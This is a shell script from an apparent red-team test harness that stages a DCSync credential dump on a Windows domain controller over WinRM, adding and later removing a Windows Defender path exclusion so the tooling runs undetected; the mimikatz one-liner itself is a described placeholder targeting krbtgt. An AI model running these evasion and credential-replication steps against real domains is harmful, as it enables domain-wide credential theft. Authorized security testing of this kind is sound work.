#!/usr/bin/env sh
# HackPit — BUILD #10 C2 PROOF 4/4: native DCSync via a SCOPED Defender exclusion (ticket 2617).
#
# WHAT THIS DEMONSTRATES. A native, domain-wide credential-replication (DCSync) dump run ON the
# real DC over gated WinRM — made to run past Windows Defender NOT by turning real-time protection
# off, but by a SCOPED exclusion for the one tool path, added before the run and REMOVED after in
# a guard that fires even if the run dies mid-way. And it proves build #9's redaction still holds
# on a real destructive run: the WinRM credential is swept out of the persisted record, and the
# dumped domain hashes are summarised as COUNTS only, never echoed into the committed transcript.
#
# WHY A SCOPED EXCLUSION, NOT AN RTP TOGGLE. `Set-MpPreference -DisableRealtimeMonitoring $true`
# lowers the whole machine's protection for the duration; a path exclusion narrows the hole to the
# single directory the operator staged the tool in, and nothing else on the DC loses coverage. It
# is the smaller, more honest change — and it is trivially reversible, which the finally guard
# below relies on.
#
# THE FINALLY-STYLE GUARD. The exclusion is removed by a trap on EXIT (and INT/TERM), guarded by a
# flag so it runs exactly once. Whether the DCSync run passes, fails, or the script is killed
# between adding the exclusion and finishing, the exclusion is taken back off the DC and its
# absence is verified. It can never be left in place.
#
# WHAT IS WRITTEN vs PASTED. The exclusion add/verify/remove, the gating, the redaction sweep and
# the accounting are written here and in the driver. The one offensive string — the mimikatz/
# DCSync one-liner — is the [[PASTE]] below, handed to the driver by file path. It is expected to
# load its tooling from the excluded TOOL_PATH.
#
# GATING. Engagement-mode (scoped to the DC) + approve-each + the danger red-confirm proved to
# refuse first. Requires the opt-in exposure up. Nothing autonomous.
#
# Usage:  sh docker/proof/c2_04_dcsync_defender_excl.sh [<windows-profile-id>]
set -u
. "$(dirname -- "$0")/c2_lib.sh"

# The single directory the DCSync tool is staged in and the exclusion is scoped to. Authored, not
# offensive — narrowing Defender's blind spot to exactly this path is the whole point.
TOOL_PATH="${HACKPIT_DCSYNC_TOOL_PATH:-C:\\hackpit\\tools}"

# ------------------------------------------------------------------------- [[PASTE POINT]] --
DCSYNC_CMD='
# [[PASTE: the mimikatz / DCSync one-liner, run ON THE DC over WinRM. It MUST:
#            * load its tooling from the excluded path "'"$TOOL_PATH"'" (so the scoped exclusion,
#              not an RTP toggle, is what lets it run),
#            * perform a DCSync credential replication against the domain (e.g. lsadump::dcsync
#              for krbtgt, or a full dump),
#            * write its results to stdout (the harness summarises them as counts and withholds
#              the raw material from the transcript).
#          Success = credential-shaped lines come back and the run exits 0. The command runs in
#          the already-authenticated WinRM session context on the DC, so it needs no password in argv — and the
#          redaction sweep confirms none leaked into the record.]]
'
# --------------------------------------------------------------------------------------------

EXCL_ADDED=0
remove_exclusion() {
  [ "$EXCL_ADDED" = "1" ] || return 0
  EXCL_ADDED=0
  mkdir -p "$C2_SCRATCH" 2>/dev/null || true
  echo "  (finally) removing the scoped Defender exclusion for $TOOL_PATH ..."
  _f=$(paste_file "excl_remove.ps1" "Remove-MpPreference -ExclusionPath '$TOOL_PATH' -ErrorAction SilentlyContinue; if ((Get-MpPreference).ExclusionPath -contains '$TOOL_PATH') { exit 1 } else { exit 0 }")
  drive winrm-probe "$C2_PROFILE" "$C2_SESSION" "excl_remove" "$_f" >/dev/null 2>&1
  if [ "$(getval EXCL_REMOVE_EXIT)" = "0" ]; then
    pass "scoped Defender exclusion REMOVED and verified gone from the DC (finally guard)"
  else
    fail "the scoped Defender exclusion may still be present on the DC — REMOVE IT BY HAND: Remove-MpPreference -ExclusionPath '$TOOL_PATH'"
  fi
}
trap 'remove_exclusion' EXIT INT TERM

c2_require_exposure   || exit 2
c2_resolve_profile "${1:-}" || exit 2

head2 "1. the DC answers over WinRM"
drive preflight "$C2_PROFILE" "$C2_SESSION"
DC=$(getval DC_HOST)
[ "$DC" ] || { c2_summary "DCSync proof aborted (no DC)"; exit 1; }

head2 "2. enter engagement mode, scoped to the DC"
drive enter-engagement "$DC" "$DC"
EID=$(getval ENGAGEMENT_ID)
echo "      engagement_id=${EID:-<none>}  target=$DC"

head2 "3. add the SCOPED Defender exclusion for the tool path (not an RTP toggle)"
_f=$(paste_file "excl_add.ps1" "Add-MpPreference -ExclusionPath '$TOOL_PATH'; if ((Get-MpPreference).ExclusionPath -contains '$TOOL_PATH') { exit 0 } else { exit 1 }")
drive winrm-probe "$C2_PROFILE" "$C2_SESSION" "excl_add" "$_f"
if [ "$(getval EXCL_ADD_EXIT)" = "0" ]; then
  EXCL_ADDED=1
  pass "scoped exclusion for $TOOL_PATH added and verified present (real-time protection untouched)"
else
  notrun "could not add/verify the scoped exclusion on the DC — DCSync step will not run"
  c2_summary "DCSync proof (no exclusion)"; exit $?
fi

head2 "4. DCSync over gated WinRM (danger refusal first, then the acknowledged run)"
_f=$(paste_file "dcsync.ps1" "$DCSYNC_CMD")
drive winrm-dcsync "$C2_PROFILE" "$C2_SESSION" "$_f" "$EID"
if [ "$(getval DCSYNC_CRED_LINES)" ] && [ "$(getval DCSYNC_CRED_LINES)" != "0" ]; then
  echo "      DCSync returned $(getval DCSYNC_CRED_LINES) credential-shaped line(s); krbtgt present: $(getval DCSYNC_KRBTGT)"
fi

head2 "5. remove the exclusion (explicit; the trap is the backstop)"
remove_exclusion

c2_summary "DCSync via scoped Defender exclusion"
exit $?
